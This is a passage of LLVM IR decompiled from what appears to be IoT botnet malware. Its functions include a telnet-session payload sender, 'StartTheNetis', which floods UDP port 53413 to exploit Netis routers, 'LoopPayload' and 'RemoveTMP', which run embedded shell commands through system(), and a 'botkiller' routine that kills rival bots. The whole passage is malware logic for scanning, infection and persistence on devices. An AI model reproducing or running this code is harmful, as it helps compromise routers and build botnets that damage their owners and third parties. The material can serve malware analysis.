  %v2_f1dc = load i32, i32* %v1_f178, align 4
  store i32 %v2_f1dc, i32* %r3.global-to-local, align 4
  %v3_f1e4 = call i32 @contains_success(i32 %v2_f1dc, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f1ec = icmp eq i32 %v3_f1e4, 0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f3dc = add i32 %v2_e0ac, 8
  br i1 %v2_f1ec, label %dec_label_pc_f3c0, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1bc
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f214 = add i32 %v2_e0ac, 9
  %v2_f214 = inttoptr i32 %v1_f214 to i8*
  %v3_f214 = load i8, i8* %v2_f214, align 1
  %v4_f214 = zext i8 %v3_f214 to i32
  store i32 %v4_f214, i32* %r3.global-to-local, align 4
  %v7_f218 = icmp eq i8 %v3_f214, 2
  br i1 %v7_f218, label %dec_label_pc_f220, label %dec_label_pc_f24c

dec_label_pc_f220:                                ; preds = %dec_label_pc_f1f4
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f244 = inttoptr i32 %v2_f3dc to i8*
  store i8 7, i8* %v3_f244, align 4
  br label %dec_label_pc_f660

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f1f4
  %v2_f250 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_f250, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v3_f270 = call i32 @get_telstate_host(i32 %v2_e0ac, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v3_f270, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f298 = add i32 %v2_e0ac, 10
  %v2_f298 = inttoptr i32 %v1_f298 to i8*
  %v3_f298 = load i8, i8* %v2_f298, align 2
  %v4_f298 = zext i8 %v3_f298 to i32
  store i32 %v4_f298, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_28744.503 to i32), i32* %r3.global-to-local, align 4
  %v4_f2a4 = mul nuw nsw i32 %v4_f298, 4
  %v5_f2a4 = add i32 %v4_f2a4, ptrtoint ([7 x i8*]* @global_var_28744.503 to i32)
  %v6_f2a4 = inttoptr i32 %v5_f2a4 to i32*
  %v7_f2a4 = load i32, i32* %v6_f2a4, align 4
  store i32 %v7_f2a4, i32* @lr, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f2c8 = add i32 %v2_e0ac, 11
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i8*
  %v3_f2c8 = load i8, i8* %v2_f2c8, align 1
  %v4_f2c8 = zext i8 %v3_f2c8 to i32
  store i32 %v4_f2c8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_28750.507 to i32), i32* %r3.global-to-local, align 4
  %v4_f2d4 = mul nuw nsw i32 %v4_f2c8, 4
  %v5_f2d4 = add i32 %v4_f2d4, ptrtoint ([4 x i8*]* @global_var_28750.507 to i32)
  %v6_f2d4 = inttoptr i32 %v5_f2d4 to i32*
  %v7_f2d4 = load i32, i32* %v6_f2d4, align 4
  %v1_f2d8 = load i32, i32* @sp, align 4
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i32*
  store i32 %v7_f2d4, i32* %v2_f2d8, align 4
  %v0_f2dc = load i32, i32* @r4, align 4
  %v0_f2e4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f2e4, i32* @r2, align 4
  %v0_f2e8 = load i32, i32* @lr, align 4
  store i32 %v0_f2e8, i32* %r3.global-to-local, align 4
  %v2_f2ec = call i32 @HackerPrint(i32 %v0_f2dc, i32 ptrtoint (i32* @global_var_1d014.512 to i32))
  %v2_f2f4 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_f2f4, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v3_f314 = call i32 @get_telstate_host(i32 %v2_e0ac, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v3_f314, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v3_f33c = load i8, i8* %v2_f298, align 2
  %v4_f33c = zext i8 %v3_f33c to i32
  store i32 %v4_f33c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_28744.503 to i32), i32* %r3.global-to-local, align 4
  %v4_f348 = mul nuw nsw i32 %v4_f33c, 4
  %v5_f348 = add i32 %v4_f348, ptrtoint ([7 x i8*]* @global_var_28744.503 to i32)
  %v6_f348 = inttoptr i32 %v5_f348 to i32*
  %v7_f348 = load i32, i32* %v6_f348, align 4
  store i32 %v7_f348, i32* @lr, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v3_f36c = load i8, i8* %v2_f2c8, align 1
  %v4_f36c = zext i8 %v3_f36c to i32
  store i32 %v4_f36c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_28750.507 to i32), i32* %r3.global-to-local, align 4
  %v4_f378 = mul nuw nsw i32 %v4_f36c, 4
  %v5_f378 = add i32 %v4_f378, ptrtoint ([4 x i8*]* @global_var_28750.507 to i32)
  %v6_f378 = inttoptr i32 %v5_f378 to i32*
  %v7_f378 = load i32, i32* %v6_f378, align 4
  %v1_f37c = load i32, i32* @sp, align 4
  %v2_f37c = inttoptr i32 %v1_f37c to i32*
  store i32 %v7_f378, i32* %v2_f37c, align 4
  %v0_f380 = load i32, i32* @r4, align 4
  %v0_f388 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f388, i32* @r2, align 4
  %v0_f38c = load i32, i32* @lr, align 4
  store i32 %v0_f38c, i32* %r3.global-to-local, align 4
  %v3_f390 = call i32 @HackerPrint(i32 %v0_f380, i32 ptrtoint ([16 x i8]* @global_var_1d080.514 to i32))
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f3b8 = inttoptr i32 %v2_f3dc to i8*
  store i8 7, i8* %v3_f3b8, align 4
  br label %dec_label_pc_f660

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f1bc
  %v3_f3e4 = inttoptr i32 %v2_f3dc to i8*
  store i8 0, i8* %v3_f3e4, align 4
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f40c = add i32 %v2_e0ac, 9
  %v4_f40c = inttoptr i32 %v3_f40c to i8*
  store i8 1, i8* %v4_f40c, align 1
  br label %dec_label_pc_f660

dec_label_pc_f414:                                ; preds = %dec_label_pc_f0bc
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f430 = add i32 %v2_e0a8, %v2_f42c
  store i32 %v2_f430, i32* %r3.global-to-local, align 4
  %v1_f434 = inttoptr i32 %v2_f430 to i32*
  %v2_f434 = load i32, i32* %v1_f434, align 4
  store i32 %v2_f434, i32* %r3.global-to-local, align 4
  %v1_f438 = add i32 %v2_f434, 7
  store i32 %v1_f438, i32* @r4, align 4
  %v2_f440 = call i32 @__GI_time(i32* null)
  store i32 %v2_f440, i32* %r3.global-to-local, align 4
  %v0_f448 = load i32, i32* @r4, align 4
  %v3_f448 = icmp ult i32 %v0_f448, %v2_f440
  br i1 %v3_f448, label %dec_label_pc_f450, label %dec_label_pc_f660

dec_label_pc_f450:                                ; preds = %dec_label_pc_f414
  %v2_f46c = add i32 %v2_e0ac, 8
  %v3_f474 = inttoptr i32 %v2_f46c to i8*
  store i8 0, i8* %v3_f474, align 4
  store i32 %v2_f46c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f49c = add i32 %v2_e0ac, 9
  %v4_f49c = inttoptr i32 %v3_f49c to i8*
  store i8 1, i8* %v4_f49c, align 1
  br label %dec_label_pc_f660

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_e0f8
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f4ac = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f4c0 = load i32, i32* @r4, align 4
  %v2_f4cc = mul i32 %v0_f4c0, 28
  %v2_f4d4 = add i32 %v2_f42c, %v2_f4cc
  %v2_f4d8 = inttoptr i32 %v2_f4d4 to i32*
  store i32 %v2_f4ac, i32* %v2_f4d8, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_f4f4 = inttoptr i32 %v2_e0ac to i32*
  %v2_f4f4 = load i32, i32* %v1_f4f4, align 4
  store i32 %v2_f4f4, i32* @r4, align 4
  %v2_f4fc = load i32, i32* bitcast ([318 x i8]** @global_var_2875c.516 to i32*), align 4
  store i32 %v2_f4fc, i32* @r5, align 4
  store i32 %v2_f4fc, i32* %r3.global-to-local, align 4
  %v1_f508 = inttoptr i32 %v2_f4fc to i8*
  %v3_f50c = call i32 @strlen(i8* %v1_f508)
  %v0_f514 = load i32, i32* @r4, align 4
  %v0_f518 = load i32, i32* @r5, align 4
  store i32 %v3_f50c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp48 = inttoptr i32 %v0_f518 to i32*
  %v6_f524 = call i32 @__libc_send(i32 %v0_f514, i32* %tmp48, i32 %v3_f50c, i32 16384)
  %v1_f52c = icmp slt i32 %v6_f524, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_f52c, label %dec_label_pc_f534, label %dec_label_pc_f5ac

dec_label_pc_f534:                                ; preds = %dec_label_pc_f4a4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f54c = load i32, i32* %v1_f4f4, align 4
  store i32 %v2_f54c, i32* %r3.global-to-local, align 4
  %v3_f554 = call i32 @sclose(i32 %v2_f54c, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f574 = add i32 %v2_e0ac, 8
  %v3_f57c = inttoptr i32 %v2_f574 to i8*
  store i8 0, i8* %v3_f57c, align 4
  store i32 %v2_f574, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f5a4 = add i32 %v2_e0ac, 9
  %v4_f5a4 = inttoptr i32 %v3_f5a4 to i8*
  store i8 1, i8* %v4_f5a4, align 1
  br label %dec_label_pc_f660

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f4a4
  %v2_f5c8 = add i32 %v2_e0ac, 8
  %v3_f5d0 = add i32 %v2_e0ac, 9
  %v4_f5d0 = inttoptr i32 %v3_f5d0 to i8*
  store i8 3, i8* %v4_f5d0, align 1
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f5f0 = add i32 %v2_e0a8, %v2_f42c
  store i32 %v2_f5f0, i32* %r3.global-to-local, align 4
  %v1_f5f4 = inttoptr i32 %v2_f5f0 to i32*
  %v2_f5f4 = load i32, i32* %v1_f5f4, align 4
  store i32 %v2_f5f4, i32* %r3.global-to-local, align 4
  %v1_f5f8 = add i32 %v2_f5f4, 60
  store i32 %v1_f5f8, i32* @r4, align 4
  %v2_f600 = call i32 @__GI_time(i32* null)
  store i32 %v2_f600, i32* %r3.global-to-local, align 4
  %v0_f608 = load i32, i32* @r4, align 4
  %v3_f608 = icmp ult i32 %v0_f608, %v2_f600
  br i1 %v3_f608, label %dec_label_pc_f610, label %dec_label_pc_f660

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5ac
  %v3_f634 = inttoptr i32 %v2_f5c8 to i8*
  store i8 0, i8* %v3_f634, align 4
  store i32 %v2_f5c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v4_f5d0, align 1
  br label %dec_label_pc_f660

dec_label_pc_f660:                                ; preds = %dec_label_pc_e990, %dec_label_pc_eb38, %dec_label_pc_ee74, %dec_label_pc_f414, %dec_label_pc_f5ac, %dec_label_pc_e0f8, %dec_label_pc_e3ec, %dec_label_pc_f534, %dec_label_pc_f450, %dec_label_pc_f3c0, %dec_label_pc_f24c, %dec_label_pc_f220, %dec_label_pc_f190, %dec_label_pc_f090, %dec_label_pc_f03c, %dec_label_pc_efac, %dec_label_pc_eeb0, %dec_label_pc_ee48, %dec_label_pc_ee1c, %dec_label_pc_ed54, %dec_label_pc_ed00, %dec_label_pc_ec70, %dec_label_pc_eb74, %dec_label_pc_eb0c, %dec_label_pc_eae0, %dec_label_pc_e9cc, %dec_label_pc_e918, %dec_label_pc_e7f8, %dec_label_pc_e780, %dec_label_pc_e5a8, %dec_label_pc_e558, %dec_label_pc_e3c0, %dec_label_pc_e368, %dec_label_pc_f610
  %v1_f664 = add nuw nsw i32 %storemerge612, 1
  store i32 %v1_f664, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_f678 = icmp slt i32 %v1_f664, 1000
  br i1 %v5_f678, label %dec_label_pc_e094, label %dec_label_pc_e088

; uselistorder directives
  uselistorder i32 %v1_f664, { 1, 0, 2 }
  uselistorder i32 %v3_f50c, { 1, 0 }
  uselistorder i32 %v2_f3dc, { 0, 10, 4, 3, 5, 6, 7, 8, 2, 1, 9 }
  uselistorder i32 %v3_ef84, { 1, 0 }
  uselistorder i32 %v2_ef3c, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_ee64, { 1, 0, 2 }
  uselistorder i32 %v3_ec48, { 1, 0 }
  uselistorder i32 %v2_ec00, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_eb28, { 1, 0, 2 }
  uselistorder i32 %v2_e810, { 2, 1, 0 }
  uselistorder i32* %v1_e650, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e240, { 1, 0 }
  uselistorder i32 %v2_e194, { 1, 0 }
  uselistorder i8* %v2_e168, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_e164, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i8 %v2_e118, { 1, 0 }
  uselistorder i32 %v0_e0dc, { 1, 0 }
  uselistorder i32* %v1_e0b4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e0b0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v2_e0ac, { 4, 5, 78, 79, 80, 82, 81, 63, 64, 65, 73, 74, 66, 67, 71, 72, 70, 69, 68, 3, 75, 77, 76, 56, 57, 58, 55, 60, 59, 62, 61, 49, 50, 52, 51, 54, 53, 42, 43, 44, 41, 46, 45, 48, 47, 35, 36, 38, 37, 40, 39, 28, 29, 30, 25, 26, 27, 18, 19, 20, 22, 23, 21, 24, 31, 32, 34, 33, 7, 8, 9, 10, 12, 11, 15, 1, 2, 14, 13, 0, 17, 16, 6 }
  uselistorder i32 %v2_e0a8, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_e0a0, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 5, 4, 7, 6, 8, 9, 10, 11, 12, 15, 14, 13, 3, 2, 0 }
  uselistorder i32 %v2_f42c, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e5fc, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_e444, { 1, 0 }
  uselistorder i32 %v1_e070, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_df6c, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-616, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 178, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 16, 33, 34, 36, 35, 37, 38, 39, 42, 40, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 58, 59, 62, 64, 63, 65, 66, 60, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 88, 85, 86, 89, 91, 90, 92, 93, 87, 96, 94, 95, 97, 98, 99, 102, 100, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 117, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 199, 127, 128, 129, 130, 131, 132, 135, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 145, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 173, 174, 175, 176, 177, 200, 191, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 172, 192, 193, 194, 196, 195, 198, 197 }
  uselistorder i32* %r2.global-to-local, { 113, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 112, 117, 114, 109, 115, 116 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8*]* @global_var_28750.507 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1d010.505 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8*]* @global_var_28744.503 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 3, { 3, 2, 0, 1, 4 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder i32 1000, { 3, 2, 1, 5, 4, 0, 6 }
  uselistorder label %dec_label_pc_f660, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e610, { 1, 0 }
  uselistorder label %dec_label_pc_e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_e0f8, { 1, 0 }
  uselistorder label %dec_label_pc_e094, { 1, 0 }
  uselistorder label %dec_label_pc_dfb4, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63152, i32* %stack_var_-4, align 4
  %v2_f6ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f6ac, i32* @fp, align 4
  %v2_f710 = ptrtoint i32* %stack_var_-52 to i32
  %v2_f738 = ptrtoint i32* %stack_var_-1076 to i32
  %tmp21 = bitcast i32* %stack_var_-1076 to i8*
  br label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6b8, %entry
  %v0_f6c4 = call i32 @socket()
  %v0_f6d0 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f6f4 = call i32 @htons(i32 53413)
  store i32 %v2_f738, i32* @r0, align 4
  %v3_f748 = call i32 @sprintf(i32 %v2_f738, i32 ptrtoint ([327 x i8]* @global_var_1d090.518 to i32))
  %v3_f75c = call i32 @strlen(i8* %tmp21)
  %v7_f790 = call i32 @__libc_sendto(i32 %v0_f6c4, i32* nonnull %stack_var_-1076, i32 %v3_f75c, i32 0, i32 %v2_f710, i32 16)
  br label %dec_label_pc_f6b8

; uselistorder directives
  uselistorder i32 %v2_f738, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f7a4 = load i32, i32* @fp, align 4
  %v2_f7c8 = call i32 @__libc_system(i32 ptrtoint ([320 x i8]* @global_var_1d1e0.522 to i32))
  store i32 %v3_f7a4, i32* @fp, align 4
  ret i32 %v2_f7c8
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-388 = alloca i32, align 4
  %stack_var_-516 = alloca i32, align 4
  %stack_var_-180 = alloca i8**, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f7e4 = load i32, i32* @r4, align 4
  store i32 %v3_f7e4, i32* %stack_var_-20, align 4
  %v6_f7e4 = load i32, i32* @fp, align 4
  store i32 63468, i32* %stack_var_-4, align 4
  %v16_f7e4 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f7e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f7e8, i32* @fp, align 4
  %v21_f808 = ptrtoint i8** %stack_var_-40 to i32
  store i32 %v21_f808, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d4f8.532, i32 0, i32 0), i8** %stack_var_-40, align 4
  %v2_f818 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_f818, i32* @r0, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_1d44c.566 to i32), i32* @r1, align 4
  store i32 92, i32* @r2, align 4
  %v0_f82c = call i32 @memcpy()
  %v21_f850 = ptrtoint i8*** %stack_var_-180 to i32
  store i32 %v21_f850, i32* @lr, align 4
  store i8** bitcast ([5 x i8]* @global_var_1d384.546 to i8**), i8*** %stack_var_-180, align 4
  %v6_f870 = icmp sgt i32 %tmp29, 0
  br i1 %v6_f870, label %dec_label_pc_f874, label %dec_label_pc_fa08

dec_label_pc_f874:                                ; preds = %entry
  %v2_f874 = ptrtoint i32* %stack_var_-516 to i32
  store i32 128, i32* @r2, align 4
  %v2_f884 = bitcast i32* %stack_var_-516 to i8*
  %v3_f884 = call i32 @__GI_memset(i8* %v2_f884, i32 0)
  %v2_f8a8 = add i32 %v16_f7e4, -52
  %v1_f8ac = inttoptr i32 %v2_f8a8 to i32*
  %v2_f8ac = load i32, i32* %v1_f8ac, align 4
  store i32 %v2_f8ac, i32* @lr, align 4
  store i32 %v16_f7e4, i32* @r4, align 4
  store i32 %v2_f874, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_f944 = call i32 @__GI_snprintf(i32 %v2_f874, i32 127, i32 ptrtoint ([100 x i8]* @global_var_1d528.594 to i32), i32 %v2_f8ac, i32 %v2_f8ac, i32 %v2_f8ac)
  %v1_f9c8 = call i32 @__libc_system(i32 %v2_f874)
  %v2_f9e8 = ptrtoint i32* %stack_var_-388 to i32
  store i32 %v2_f9e8, i32* @r0, align 4
  %v3_f9f4 = call i32 @sprintf(i32 %v2_f9e8, i32 ptrtoint ([14 x i8]* @global_var_1d5ac.598 to i32))
  %v1_fa00 = call i32 @__libc_system(i32 %v2_f9e8)
  br label %dec_label_pc_fa10

dec_label_pc_fa08:                                ; preds = %entry
  %v1_fa0c = call i32 @sleep(i32 5)
  br label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %dec_label_pc_f874, %dec_label_pc_fa08
  %storemerge26 = phi i32 [ %v1_fa0c, %dec_label_pc_fa08 ], [ %v1_fa00, %dec_label_pc_f874 ]
  %v2_fa14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fa14, i32* @r4, align 4
  store i32 %v6_f7e4, i32* @fp, align 4
  ret i32 %storemerge26

; uselistorder directives
  uselistorder i32 %v2_f9e8, { 0, 2, 1 }
  uselistorder i32 %v2_f8ac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f874, { 0, 2, 1 }
  uselistorder i32 %v16_f7e4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 1, 0 }
  uselistorder i8*** %stack_var_-180, { 1, 0 }
  uselistorder label %dec_label_pc_fa10, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_fa34 = load i32, i32* @fp, align 4
  store i32 %v3_fa34, i32* %stack_var_-16, align 4
  %v2_fa40 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_1d5bc.601 to i32))
  %v2_fa48 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1d5e8.603 to i32))
  %v2_fa50 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1d600.605 to i32))
  %v2_fa58 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1d5e8.603 to i32))
  %v2_fa60 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_1d618.607 to i32))
  %v2_fa68 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_1d628.609 to i32))
  %v2_fa70 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_1d634.611 to i32))
  %v2_fa78 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_1d64c.613 to i32))
  %v2_fa80 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_1d660.615 to i32))
  %v2_fa88 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_1d66c.617 to i32))
  %v2_fa90 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_1d680.619 to i32))
  %v2_fa98 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1d690.621 to i32))
  %v2_faa0 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_1d6a8.623 to i32))
  %v2_faa4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_faa4, i32* @fp, align 4
  ret i32 %v2_faa0

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_fadc = load i32, i32* @fp, align 4
  store i32 64228, i32* %stack_var_-4, align 4
  %v2_fae0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fae0, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_fb08 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fb18 = icmp eq i32 %v1_fb08, 0
  br i1 %v2_fb18, label %dec_label_pc_fb20, label %dec_label_pc_fb2c

dec_label_pc_fb20:                                ; preds = %entry
  br label %dec_label_pc_fc14

dec_label_pc_fb2c:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_fb30 = add i32 %v1_fb08, 16
  %v2_fb30 = inttoptr i32 %v1_fb30 to i32*
  %v3_fb30 = load i32, i32* %v2_fb30, align 4
  %v1_fb34 = inttoptr i32 %v3_fb30 to i32*
  %v2_fb34 = load i32, i32* %v1_fb34, align 4
  %v1_fb3c = add i32 %v1_fb08, 12
  %v2_fb3c = inttoptr i32 %v1_fb3c to i32*
  %v3_fb3c = load i32, i32* %v2_fb3c, align 4
  store i32 %v3_fb3c, i32* @r2, align 4
  %v2_fb48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_fb54 = call i32 @bcopy(i32 %v2_fb34, i32 %v2_fb48, i32 %v3_fb3c)
  %v1_fb6c = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_fb9c = call i32 @socket()
  %v6_fbc4 = call i32 @__GI_setsockopt(i32 %v0_fb9c, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_fbcc = icmp eq i32 %v0_fb9c, -1
  br i1 %v3_fbcc, label %dec_label_pc_fbd4, label %dec_label_pc_fbe0

